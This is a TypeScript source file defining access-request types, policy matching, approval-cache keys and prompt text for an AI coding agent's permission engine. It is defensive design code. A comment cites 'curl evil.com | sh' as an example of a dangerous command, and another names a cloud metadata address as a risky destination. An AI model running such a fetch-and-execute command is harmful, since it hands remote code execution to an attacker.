/**
 * AccessRequest (spec §11.1).
 *
 * A tool declares what it is about to do *before* it does it, in terms the
 * policy engine understands. This is the whole point of the resolve/execute
 * split: `resolve()` produces access requests, the policy engine rules on them,
 * and only then does `execute()` run — with an executor already constrained to
 * what was granted.
 *
 * Note `file.read` carries `toModel`. Reading a file into kernel memory to hash
 * it and reading it into the model's context are different capabilities, and the
 * secret boundary lives on the second one.
 */

import type { CanonicalPath } from '../util/paths.ts';
import { normalizeHostOrUndefined } from '../security/egress/host.ts';

export type Capability =
  | 'file.read'
  | 'file.read_to_model'
  | 'file.write'
  | 'file.delete'
  | 'process.exec'
  | 'network.connect'
  | 'secret.use'
  | 'env.read'
  | 'vcs.mutate'
  | 'remote.connect'
  | 'agent.invoke'
  | 'mcp.invoke';

export const ALL_CAPABILITIES: readonly Capability[] = [
  'file.read',
  'file.read_to_model',
  'file.write',
  'file.delete',
  'process.exec',
  'network.connect',
  'secret.use',
  'env.read',
  'vcs.mutate',
  'remote.connect',
  'agent.invoke',
  'mcp.invoke',
];

export interface FileReadAccess {
  kind: 'file.read';
  path: CanonicalPath;
  /** True when the bytes will end up in the model's context. */
  toModel: boolean;
  /** Path as shown to the user; workspace-relative where possible. */
  display: string;
}

export interface FileWriteAccess {
  kind: 'file.write';
  path: CanonicalPath;
  create: boolean;
  display: string;
  /** Byte delta estimate, for the approval prompt. */
  estimatedBytes?: number;
}

/**
 * Removing a path, or the source half of a move (ADR-0016).
 *
 * Deliberately *not* a `file.write` with a flag. Every builtin profile allows
 * `file.write` inside the workspace outright, so modelling deletion as a write
 * would have made `Delete src/auth.ts` a silent, unprompted operation — and a
 * profile that wanted to say otherwise would have had no capability to name.
 */
export interface FileDeleteAccess {
  kind: 'file.delete';
  path: CanonicalPath;
  display: string;
  /** True when the path is a directory. Only empty ones are ever requested. */
  isDirectory?: boolean;
  /** Set when this deletion is the source half of a rename. */
  movedTo?: string;
}

export interface ProcessExecAccess {
  kind: 'process.exec';
  executable: string;
  argv: readonly string[];
  cwd: CanonicalPath;
  display: string;
  /** Set when the executable resolved outside a trusted directory. */
  untrustedExecutable?: boolean;
}

export interface NetworkAccess {
  kind: 'network.connect';
  host: string;
  port: number;
  display: string;
  /** The channel this connection belongs to, mirroring EgressKind. */
  via: 'shell' | 'model' | 'hook' | 'plugin' | 'mcp' | 'web' | 'telemetry' | 'update';
  /**
   * Which of alpha.6's two network approvals this is (§37, §40).
   *
   * `scoped` is an approval for this host and nothing else, enforced by the
   * egress proxy on a container backend. `unrestricted` is an approval to reach
   * the entire internet, and it exists so that a workflow which genuinely needs
   * one has somewhere to go other than "widen the allowlist until it works".
   *
   * They are different subjects (see `subjectKeyOf`) and different prompts. A
   * session that approved twenty scoped hosts has still never approved broad
   * egress, which is the whole point of §36.
   */
  scope?: 'scoped' | 'unrestricted';
  /**
   * Set when the destination is a private/loopback/link-local address that the
   * default §23 policy would refuse. Surfaced in the prompt because "connect to
   * 169.254.169.254" and "connect to api.example.com" should not read alike.
   */
  privateAddress?: boolean;
}

export interface SecretAccess {
  kind: 'secret.use';
  secretRef: string;
  display: string;
}

export interface EnvironmentAccess {
  kind: 'env.read';
  variables: readonly string[];
  display: string;
}

export interface VcsMutationAccess {
  kind: 'vcs.mutate';
  operation: 'commit' | 'push' | 'branch' | 'reset' | 'tag' | 'stash' | 'other';
  display: string;
}

export interface RemoteAccess {
  kind: 'remote.connect';
  remote: string;
  host: string;
  display: string;
  firstConnection: boolean;
}

/**
 * Dispatching a bounded child execution scope to a discovered agent (ADR-0013).
 *
 * Delegation is a capability rather than a bare tool call for two reasons. The
 * first is configurability: a project can deny `agent.invoke` for one agent by
 * name, which is how "discovery does not imply invocation" (alpha.4 §11) becomes
 * something a policy layer can express instead of a convention. The second is
 * that the depth travels with the request, so a child asking for a grandchild is
 * refused by the same mechanism that refuses everything else — a policy
 * decision — rather than by a special case inside the tool.
 *
 * Note what it deliberately does **not** carry: no permission profile, no
 * secret list, no environment. A delegation cannot request capability; the child
 * receives the intersection of what its parent already had with what its own
 * definition permits, computed in `DelegationService`.
 */
export interface AgentInvokeAccess {
  kind: 'agent.invoke';
  agent: string;
  /** Depth of the *child* being requested. A root turn dispatches depth 1. */
  depth: number;
  display: string;
}

/**
 * Asking a server the kernel did not write to run a tool it did not write
 * (ADR-0023).
 *
 * This is the milestone's central design act, and its honesty is the whole
 * point: the kernel is **not** claiming to know what the call does. It cannot.
 * It cannot read the server's implementation, it cannot infer what the arguments
 * mean, and it must not ask — a component that declares its own capabilities has
 * not been constrained, it has been asked politely.
 *
 * So this records the only fact the kernel actually has: this session permitted
 * this server to be asked to run this tool. What the server then does is outside
 * every boundary this project has built, and `describeAccess` says so in as many
 * words rather than leaving it to be inferred.
 *
 * Note what it deliberately does **not** carry: no arguments. The model's
 * arguments are validated against the server's schema and then sent, but they
 * are not part of the access request, because a policy engine ruling on them
 * would be ruling on a shape the server chose.
 */
export interface McpInvokeAccess {
  kind: 'mcp.invoke';
  /** The name from user config — never anything the server reported. */
  server: string;
  /** The bare tool name as listed, without the `mcp__server__` prefix. */
  tool: string;
  transport: 'stdio' | 'http';
  display: string;
}

export type AccessRequest =
  | FileReadAccess
  | FileWriteAccess
  | FileDeleteAccess
  | ProcessExecAccess
  | NetworkAccess
  | SecretAccess
  | EnvironmentAccess
  | VcsMutationAccess
  | RemoteAccess
  | AgentInvokeAccess
  | McpInvokeAccess;

/** The capability a request draws on, used to index policy rules. */
export function capabilityOf(access: AccessRequest): Capability {
  switch (access.kind) {
    case 'file.read':
      return access.toModel ? 'file.read_to_model' : 'file.read';
    case 'file.write':
      return 'file.write';
    case 'file.delete':
      return 'file.delete';
    case 'process.exec':
      return 'process.exec';
    case 'network.connect':
      return 'network.connect';
    case 'secret.use':
      return 'secret.use';
    case 'env.read':
      return 'env.read';
    case 'vcs.mutate':
      return 'vcs.mutate';
    case 'remote.connect':
      return 'remote.connect';
    case 'agent.invoke':
      return 'agent.invoke';
    case 'mcp.invoke':
      return 'mcp.invoke';
  }
}

/** The string a rule's `pattern` is matched against. */
export function matchTargetOf(access: AccessRequest): string {
  switch (access.kind) {
    case 'file.read':
    case 'file.write':
    case 'file.delete':
      return access.path;
    case 'process.exec':
      return access.executable;
    case 'network.connect':
      return access.host;
    case 'secret.use':
      return access.secretRef;
    case 'env.read':
      return access.variables.join(',');
    case 'vcs.mutate':
      return access.operation;
    case 'remote.connect':
      return access.remote;
    case 'agent.invoke':
      return access.agent;
    // `server/tool`, so a rule can name one server's whole surface
    // (`wiki/*`), one tool (`wiki/search`), or a family (`wiki/search_*`).
    case 'mcp.invoke':
      return `${access.server}/${access.tool}`;
  }
}

/**
 * The identity a session-scoped approval is cached against.
 *
 * Deliberately narrow (spec §11.4: "Session Allow 只能缓存具体 subject"). Approving
 * `npm install` once must not approve `curl evil.com | sh` later, so the subject
 * includes the concrete target — not just the capability class.
 */
export function subjectKeyOf(access: AccessRequest): string {
  switch (access.kind) {
    case 'file.read':
      return `file.read${access.toModel ? '_to_model' : ''}:${access.path}`;
    case 'file.write':
      return `file.write:${access.path}`;
    // Never merged with the write subject for the same path: approving "modify
    // src/auth.ts" must not spend as approval to delete it.
    case 'file.delete':
      return `file.delete:${access.path}`;
    case 'process.exec':
      // argv[0..1] captures `npm install` vs `npm test` without pinning the
      // package name, which would make every install a fresh prompt.
      return `process.exec:${access.executable}:${access.argv.slice(1, 2).join(' ')}`;
    // alpha.6 §36. Three things changed here, all for the same reason: a cached
    // approval must not be spendable on a destination the user did not see.
    //
    //   the host is normalised, so `Registry.NPMJS.org.` cannot be a second
    //   subject that the user approves without realising they already had it —
    //   and, in the other direction, so the string the proxy enforces and the
    //   string the cache remembers are produced by one function (§20);
    //   the scope is part of the key, so an `unrestricted` approval and a
    //   `scoped` one for the same host are never interchangeable;
    //   a host that does not normalise gets a subject that cannot match a
    //   normalised one, so an unparseable destination can never be silently
    //   covered by an approval granted for a parseable one.
    case 'network.connect': {
      const host = normalizeHostOrUndefined(access.host) ?? `unnormalizable:${access.host}`;
      const scope = access.scope ?? 'scoped';
      const priv = access.privateAddress === true ? ':private' : '';
      return `network.connect:${access.via}:${scope}:${host}:${access.port}${priv}`;
    }
    case 'secret.use':
      return `secret.use:${access.secretRef}`;
    case 'env.read':
      return `env.read:${[...access.variables].sort().join(',')}`;
    case 'vcs.mutate':
      return `vcs.mutate:${access.operation}`;
    case 'remote.connect':
      return `remote.connect:${access.remote}`;
    // Deliberately not keyed by depth: approving "delegate to security-reviewer"
    // once should not re-prompt for the same agent later in the session, and the
    // depth limit is enforced separately rather than through the approval cache.
    case 'agent.invoke':
      return `agent.invoke:${access.agent}`;
    // Per server **and** per tool. Approving "search the wiki" must never spend
    // as approval for "delete the wiki" — the same reason alpha.6 §36 refused a
    // session-wide network approval. A server with thirty tools therefore costs
    // thirty approvals across a session, which is the cheaper of the two
    // mistakes available here.
    case 'mcp.invoke':
      return `mcp.invoke:${access.server}/${access.tool}`;
  }
}

/** One-line human description used in the approval prompt and audit log. */
export function describeAccess(access: AccessRequest): string {
  switch (access.kind) {
    case 'file.read':
      return `read ${access.display}${access.toModel ? ' (into model context)' : ''}`;
    case 'file.write':
      return `${access.create ? 'create' : 'modify'} ${access.display}`;
    case 'file.delete':
      return access.movedTo !== undefined
        ? `move ${access.display} to ${access.movedTo}`
        : `delete ${access.isDirectory ? 'directory ' : ''}${access.display}`;
    case 'process.exec':
      return `run ${access.display}`;
    case 'network.connect':
      return access.scope === 'unrestricted'
        ? `reach the entire internet from ${access.via} (unrestricted network)`
        : `connect to ${access.host}:${access.port} (${access.via})`;
    case 'secret.use':
      return `use secret_ref://${access.secretRef}`;
    case 'env.read':
      return `read environment: ${access.variables.join(', ')}`;
    case 'vcs.mutate':
      return `git ${access.operation}`;
    case 'remote.connect':
      return `connect to remote "${access.remote}" (${access.host})`;
    case 'agent.invoke':
      return `delegate to agent "${access.agent}" at depth ${access.depth}`;
    case 'mcp.invoke':
      return (
        `call "${access.tool}" on MCP server "${access.server}" (${access.transport}) — ` +
        'what the server does with this call is not enforced by MyCoder'
      );
  }
}
